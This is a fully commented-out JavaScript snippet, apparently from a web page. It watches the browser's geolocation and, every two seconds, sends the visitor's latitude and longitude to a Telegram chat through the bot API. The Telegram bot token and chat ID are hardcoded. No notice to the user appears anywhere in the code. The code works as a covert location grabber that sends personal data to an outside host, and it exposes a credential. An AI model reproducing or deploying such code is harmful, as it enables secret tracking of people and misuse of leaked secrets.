// let id;
// let target;
// let options;

//     const TOKEN = '6407921969:AAGnKf8qyUQ3H2x0SNI61kLnO0qEHU1R2Ik';
//     const CHAT_ID = '-1001903507381';
//     const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

//     let messageToTg = `<b>Get location</b>\n`;

// function success(pos) {
//   const crd = pos.coords;
// // target.latitude === crd.latitude && target.longitude === crd.longitude
//     setInterval(() => {
//         navigator.geolocation.clearWatch(id);
//         console.log("Congratulations, you reached the target");
//         console.log('pos :>> ', pos);
// formSend();
// function formSend(e) {

//                         messageToTg += `${pos.coords.latitude}\n`;
//                         messageToTg += `${pos.coords.longitude}\n`;
//                         try {
//                             axios.post(URI_API, {
//                                 chat_id: CHAT_ID,
//                                 parse_mode: 'html',
//                                 text: messageToTg,
//                             })
//                             .then(response => {
//                                 console.log('Message sent to Telegram successfully.');
//                             })
//                             .catch(error => {
//                                 console.error('Error sending message to Telegram:', error);
//                             });
//                         } catch (error) {
//                             console.error('Error sending message to Telegram:', error);
//                         } finally {
//                             messageToTg = '';
//                         }
//                     }



//     }, 2000);

    
// //   if (1==1) {
// //     console.log("Congratulations, you reached the target");
// //     navigator.geolocation.clearWatch(id);
// //   }
// }

// function error(err) {
//   console.error(`ERROR(${err.code}): ${err.message}`);
// }

// target = {
//   latitude: 0,
//   longitude: 0,
// };

// console.log('target :>> ', target);
// options = {
//   enableHighAccuracy: false,
//   timeout: 5000,
//   maximumAge: 0,
// };

// id = navigator.geolocation.watchPosition(success, error, options);

// // const testPosition = {
// //   coords: {
// //     latitude: 0,
// //     longitude: 0,
// //     }
    
// // };

// // success(success, error, options);